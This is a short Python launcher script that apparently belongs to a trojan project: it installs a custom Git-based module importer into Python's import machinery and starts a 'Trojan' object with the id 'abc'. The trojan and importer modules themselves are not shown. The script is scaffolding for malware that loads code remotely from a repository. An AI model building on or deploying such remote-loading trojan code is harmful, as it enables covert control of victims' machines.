import sys

from modules.trojan import Trojan
from modules.gitimporter import GitImporter

if __name__ == '__main__':
    # Ensure GitImporter is only added once
    sys.meta_path.insert(0, GitImporter())
    trojan = Trojan('abc')
    trojan.run()
